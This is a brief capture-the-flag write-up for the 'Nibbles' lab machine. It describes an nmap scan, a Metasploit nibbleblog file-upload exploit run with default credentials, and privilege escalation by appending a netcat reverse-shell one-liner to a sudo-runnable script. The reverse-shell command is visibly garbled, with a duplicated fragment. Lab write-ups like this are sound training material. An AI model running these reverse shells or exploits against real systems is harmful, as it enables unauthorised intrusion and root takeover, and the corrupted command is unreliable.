
After running a service `nmap` scan, I see ports `22` (ssh) and `80` (tcp) open.

Looking at the page source of the initial web address shows a comment to the directory `/nibbleblog/`.

In a metasploit terminal I search `nibbleblog` and get the exploit `exploit/multi/http/nibbleblog_file_upload`, which requires credentials, but the default credentials `admin:nibbles` work. Using the options keyword be sure to add all required settings for the payload.



Once I get shell access I run `sudo -l` and find the user `nibbler` can run `/home/nibbler/personal/stuff/monitor.sh`. I append my shell to the end of the script and run netcat locally to get root access.

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.154 8083 > /tmp/f" >> monitor.sh < /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.154 8083 > /tmp/f" >> monitor.sh
```

```
$ nc -lnvp 8083
$ id
uid=0(root) gid=0(root) groups=0(root)
```

The root flag is in `/root/root.txt`


